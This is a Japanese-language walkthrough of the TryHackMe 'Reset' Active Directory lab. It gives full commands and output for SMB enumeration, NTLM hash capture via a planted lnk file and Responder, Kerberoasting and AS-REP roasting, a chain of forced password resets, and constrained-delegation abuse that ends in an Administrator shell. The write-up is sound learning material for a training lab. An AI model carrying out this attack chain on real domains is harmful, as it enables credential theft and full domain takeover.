# Reset CTF

https://tryhackme.com/room/resetui

## Enumeration

```shell
TARGET=10.48.142.6
sudo bash -c "echo $TARGET   reset.thm >> /etc/hosts"
```

### ポートスキャン

```sh
sudo nmap -vv -Pn -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
7680/tcp  open  pando-pub        syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49673/tcp open  unknown          syn-ack ttl 128
49675/tcp open  unknown          syn-ack ttl 128
49694/tcp open  unknown          syn-ack ttl 128
49699/tcp open  unknown          syn-ack ttl 128
```

```sh
nmap -sV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,7680,9389,49668,49669,49670,49673,49675,49694,49699 $TARGET

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-24 04:31:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
```

```sh
$ ldapsearch -x -H ldap://$TARGET -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=thm,DC=corp
ldapServiceName: thm.corp:haystack$@THM.CORP
```

### SMB, NFS

Data共有を発見。

```sh
root@ip-10-48-124-253:~# smbclient -L \\$TARGET -U ""
Password for [WORKGROUP\]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Dataから3ファイルダウンロード

```sh
$ cat jdamybxg.4yr.txt 
Subject: Welcome to Reset -�Dear <USER>,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone.The initial passowrd is: ResetMe123!We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role.Best regards,The Reset Team 
```

bpabhnju.ogv.pdf から抜粋されたものだったが、名前が入っている。

```sh
Subject: Welcome to Reset -
Dear LILY ONEILL,
Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login
information to access your company account. Please keep this information confidential and do not share it with anyone.
The initial passowrd is: ResetMe123!
We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in
your new role.Best regards,
[The Reset Team
```

デフォルトパスワードらしきものを入手。有効なユーザー名を発見したい。

"LILY ONEILL" 由来のユーザー名を探したがヒットしなかった。

```sh
$ echo "LILY ONEILL" > users.lst

$ python3 username_generator.py -w users.lst
lily
oneill
l.oneill
l-oneill
l_oneill
l+oneill
loneill
lilyoneill
oneilllily
lily.oneill
oneill.lily
```

```sh
~/tools/kerbrute userenum --dc $TARGET -d thm.corp User.txt
```

seclists のユーザー名もヒットせず。

```sh
~/tools/kerbrute userenum --dc $TARGET -d thm.corp /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

行き詰ってウォークスルーを見た。

SMB上のファイル名が変わっている。これは、ユーザーがここのファイルにアクセスしていることを示唆している。

```sh
smb: \onboarding\> ls
  .                                   D        0  Tue Feb 24 14:43:28 2026
  ..                                  D        0  Tue Feb 24 14:43:28 2026
  eslwnwbk.xnm.txt                    A      521  Tue Aug 22 03:21:59 2023
  oz4sqmgc.adx.pdf                    A  4700896  Mon Jul 17 17:11:53 2023
  vhkqtqwn.fv2.pdf                    A  3032659  Mon Jul 17 17:12:09 2023
```

kaliにNTLMリレーするようなファイルを生成するツール。

https://github.com/Greenwolf/ntlm_theft.git 

lnkファイルを置いて、responderで盗聴。

```sh
[SMB] NTLMv2-SSP Client   : 10.48.142.6
[SMB] NTLMv2-SSP Username : THM\[REDACTED]   
[SMB] NTLMv2-SSP Hash     : [REDACTED]                                   
[*] Skipping previously captured hash for THM\[REDACTED]   
```

hashcatでクラックできた。

SMB, WinRM ともに接続可能。

## 権限昇格

めぼしい権限やグループは無い。

```sh
*Evil-WinRM* PS C:\Users\automate> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```sh
*Evil-WinRM* PS C:\Users\automate> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Privsecを実行したが、明確な脆弱性は無い。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
┃ NAME     ┃ Hardening - LAPS                                  ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether LAPS is configured and enabled. Note that this ┃
┃ applies to domain-joined machines only.                      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Policy      : Enable local admin password management (LAPS legacy)
Key         : HKLM\Software\Policies\Microsoft Services\AdmPwd
Default     : 0
Value       : (null)
Description : The local administrator password is not managed (default).

Policy      : LAPS > Configure password backup directory
Key         : HKLM\Software\Microsoft\Policies\LAPS
Default     : 0
Value       : (null)
Description : The local administrator password is not backed up (default).



[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:00.280
```

```sh
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/10/2023  10:23 AM                Administrator
d-----        2/24/2026   6:30 AM                automate
d-----        2/24/2026   4:36 AM                CECILE_WONG
d-r---        6/16/2023   4:17 PM                Public
```

CECILE_WONGに対してデフォルトパスワードを試したが失敗。

全ユーザーに対して、デフォルトパスワードおよび現ユーザーと同じパスワードでパスワードスプレーしたがヒットしなかった。

```sh
*Evil-WinRM* PS C:\EFI> net user

User accounts for \\

-------------------------------------------------------------------------------
3091731410SA             3811465497SA             3966486072SA
Administrator            ANDY_BLACKWELL           AUGUSTA_HAMILTON
AUTOMATE                 CECILE_WONG              CHERYL_MULLINS
CHRISTINA_MCCORMICK      CRUZ_HALL                CYRUS_WHITEHEAD
DANIEL_CHRISTENSEN       DARLA_WINTERS            DEANNE_WASHINGTON
ELLIOT_CHARLES           ERNESTO_SILVA            FANNY_ALLISON
Guest                    HORACE_BOYLE             HOWARD_PAGE
JULIANNE_HOWE            krbtgt                   LEANN_LONG
LETHA_MAYO               LILY_ONEILL              LINDSAY_SCHULTZ
MARCELINO_BALLARD        MARION_CLAY              MICHEL_ROBINSON
MITCHELL_SHAW            MORGAN_SELLERS           RAQUEL_BENSON
RICO_PEARSON             ROSLYN_MATHIS            SHAWNA_BRAY
STEWART_SANTANA          TABATHA_BRITT            TED_JACOBSON
TRACY_CARVER             TREVOR_MELTON
```

ケルベロースティングを実行したが、クラック可能なハッシュは無かった。

```sh
[-] CCache file is not found. Skipping...
$krb5tgs$23$*MARCELINO_BALLARD$THM.CORP$thm.corp/MARCELINO_BALLARD*$08112ce1319c60d4[REDACTED]
$krb5tgs$23$*3811465497SA$THM.CORP$thm.corp/3811465497SA*$14831d477291050c5d89202b82[REDACTED]
$krb5tgs$23$*MARION_CLAY$THM.CORP$thm.corp/MARION_CLAY*$2d0160f035709154479135c82dd6[REDACTED]
$krb5tgs$23$*FANNY_ALLISON$THM.CORP$thm.corp/FANNY_ALLISON*$cf1b0a40021b90aa2e99c3e5[REDACTED]
$krb5tgs$23$*CYRUS_WHITEHEAD$THM.CORP$thm.corp/CYRUS_WHITEHEAD*$5c219bb817e57d7d97fc[REDACTED]
$krb5tgs$23$*TRACY_CARVER$THM.CORP$thm.corp/TRACY_CARVER*$c0624c955a2253baf2a04d61b4[REDACTED]
$krb5tgs$23$*DEANNE_WASHINGTON$THM.CORP$thm.corp/DEANNE_WASHINGTON*$3f370f1ea211c09c[REDACTED]
$krb5tgs$23$*DARLA_WINTERS$THM.CORP$thm.corp/DARLA_WINTERS*$0567887b5420a1d4101df788[REDACTED]
```

AS-REP Roasting でいくつか出てきた。このうち、TABATHA_BRITT のハッシュをクラックできた。

```sh
$ GetNPUsers.py -dc-ip $TARGET thm.corp/ -usersfile ./names.txt     
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/myenv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
...
$krb5asrep$23$ERNESTO_SILVA@THM.CORP:ff73abad7065e0ee2c5e34c3be4e9faf$[REDACTED]
...
$krb5asrep$23$LEANN_LONG@THM.CORP:d50e62caccb5d943437bdeb260292f42$4df[REDACTED]
...
$krb5asrep$23$TABATHA_BRITT@THM.CORP:681e796373c8ea9b45f039d4c0e4aecc$[REDACTED]
...
```

TABATHA_BRITT は、SMB接続できるがWinRM接続できない。

bloodhound-python で列挙、bloodhound でグラフ表示したら、Administratorまでは下記のフローになる。長い！

```
TABATHA_BRITT -> SHAWNA_BRAY (GenericAll)
SHAWNA_BRAY -> CRUZ_HALL (ForceChangePassword)
CRUZ_HALL -> DARLA_WINTERS (Owns, GenericWrite, ForceChangePassword)
DARLA_WINTERS -> HAYSTACK.THM.CORP (AllowedToDelegate)
HAYSTACK.THM.CORP -> THM.CORP (CoerceToTGT)
```

### TABATHA_BRITT -> SHAWNA_BRAY (GenericAll)

エラーが出た。PowerView の機能なのでアップロードが必要。

```ps
$SecPassword = ConvertTo-SecureString '[redacted]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('thm.corp\TABATHA_BRITT', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity SHAWNA_BRAY -AccountPassword $UserPassword -Credential $Cred

The term 'Set-DomainUserPassword' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:4 char:1
+ Set-DomainUserPassword -Identity SHAWNA_BRAY -AccountPassword $UserPa ...
+ ~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Set-DomainUserPassword:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

代わりに ActiveDirectoryモジュールを使う方法を使う。

```ps
Import-Module ActiveDirectory

$SecPassword = ConvertTo-SecureString '[redacted]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('thm.corp\TABATHA_BRITT', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity SHAWNA_BRAY -NewPassword $UserPassword -Reset -Credential $Cred
```

### SHAWNA_BRAY -> CRUZ_HALL (ForceChangePassword)

```ps
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('thm.corp\SHAWNA_BRAY', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity CRUZ_HALL -NewPassword $UserPassword -Reset -Credential $Cred
```

### CRUZ_HALL -> DARLA_WINTERS (Owns, GenericWrite, ForceChangePassword)

```ps
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('thm.corp\CRUZ_HALL', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-ADAccountPassword -Identity DARLA_WINTERS -NewPassword $UserPassword -Reset -Credential $Cred
```

### DARLA_WINTERS -> HAYSTACK.THM.CORP (AllowedToDelegate)

Kerberos Constrained Delegation (S4U) Abuse

```ps
$ getST.py -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
/home/kali/myenv/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/myenv/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/kali/myenv/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/myenv/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
```

```sh
$ ls -al Admini*       
-rw-rw-r-- 1 kali kali 1657 Feb 25 11:36 Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
```

```sh
$ export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache

$ wmiexec.py THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator
```

## 振り返り

- 非常に難しくとても自力ではクリアできず、全体的に実力不足を痛感した。その分、非常に大きな学びがあった。
- NTLMリレーとbloodhoundは気づきにくく難しかった。というよりbloodhoundは単純に理解が浅かった。
- Kerberos Constrained Delegation (S4U) Abuse は初見。
- パスワード変更については、kaliから下記のような形でも可能。

```sh
net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U 'TABATHA_BRITT'%'REDACTED' -I '10.10.237.77' -S "THM.CORP"
```

## Tags

#tags:NTLMリレー #tags:bloodhound #tags:Kerberos
